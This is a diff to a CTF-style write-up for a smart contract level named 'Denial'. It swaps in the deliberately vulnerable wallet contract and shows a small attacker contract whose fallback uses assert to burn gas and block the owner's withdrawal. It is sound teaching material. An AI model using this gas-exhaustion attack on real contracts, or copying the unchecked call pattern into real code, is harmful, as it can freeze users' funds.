@@ -10,7 +10,6 @@ This is a simple wallet that drips funds over time. You can withdraw the funds s
 
 If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds) you will win this game.
 
-
 ## What will you learn?
 
 1. `call` vs `transfer`
@@ -46,18 +45,18 @@ Let's make a experiment. You are going to send some ether to the contract, of co
 pragma solidity ^0.6.0;
 
 contract Hacker {
-    fallback() external payable {
-        assert(false);
-    }
+  fallback() external payable {
+    assert(false);
+  }
 }
+
 ```
 
 - v0.6.12
-![image](https://user-images.githubusercontent.com/78368735/124986696-e8344800-e009-11eb-8447-bc247b69c79d.png)
-
+  ![image](https://user-images.githubusercontent.com/78368735/124986696-e8344800-e009-11eb-8447-bc247b69c79d.png)
 
 - v0.8.6 🙌
-![image](https://user-images.githubusercontent.com/78368735/124986625-d5217800-e009-11eb-8b91-88cfe002b6ae.png)
+  ![image](https://user-images.githubusercontent.com/78368735/124986625-d5217800-e009-11eb-8b91-88cfe002b6ae.png)
 
 ### Deny
 
@@ -69,6 +68,8 @@ We can write a contract with a `fallback` function that will trigger `assert` an
 
 The goal is to make the `withdraw` call fail. We control the `partner` contract. The contract writer’s idea was that even if we revert in our contract using `revert` / `require` only our function call would fail but the withdrawal to the original owner would still continue. While this is true, notice that our function is being called using `.call` without specifying an explicit gas limit. We can just consume all available gas in the transaction resulting in the caller function to be out of gas and fail. Contrary to `revert` and `require`, the `assert` instruction consumes all gas.
 
+_**NOTE:** You can't consume the entire gas with `assert` since Solidity v0.8.0_ 💩
+
 ## Source Code
 
 ⚠️This contract contains a bug or risk. Do not use on mainnet!
@@ -77,23 +78,34 @@ The goal is to make the `withdraw` call fail. We control the `partner` contract.
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-contract Token {
-  mapping(address => uint256) balances;
-  uint256 public totalSupply;
+contract Denial {
+  address public partner; // withdrawal partner - pay the gas, split the withdraw
+  address payable public constant owner = payable(address(0xA9E));
+  uint256 timeLastWithdrawn;
+  mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances
 
-  constructor(uint256 _initialSupply) public {
-    balances[msg.sender] = totalSupply = _initialSupply;
+  function setWithdrawPartner(address _partner) public {
+    partner = _partner;
   }
 
-  function transfer(address _to, uint256 _value) public returns (bool) {
-    require(balances[msg.sender] - _value >= 0);
-    balances[msg.sender] -= _value;
-    balances[_to] += _value;
-    return true;
+  // withdraw 1% to recipient and 1% to owner
+  function withdraw() public {
+    uint256 amountToSend = address(this).balance / 100;
+    // perform a call without checking return
+    // The recipient can revert, the owner will still get their share
+    partner.call.value(amountToSend)("");
+    owner.transfer(amountToSend);
+    // keep track of last withdrawal time
+    timeLastWithdrawn = now;
+    withdrawPartnerBalances[partner] += amountToSend;
   }
 
-  function balanceOf(address _owner) public view returns (uint256 balance) {
-    return balances[_owner];
+  // allow deposit of funds
+  fallback() external payable {}
+
+  // convenience function
+  function contractBalance() public view returns (uint256) {
+    return address(this).balance;
   }
 }
 
@@ -124,8 +136,6 @@ truffle develop
 test
 ```
 
-You should take ownership of the target contract successfully.
-
 ```
 truffle(develop)> test
 Using network 'develop'.
@@ -138,9 +148,9 @@ Compiling your contracts...
 
 
   Contract: Hacker
-    √ should steal countless of tokens (377ms)
+    √ should deny owner to withdraw (639ms)
 
 
-  1 passing (440ms)
+  1 passing (689ms)
 
 ```
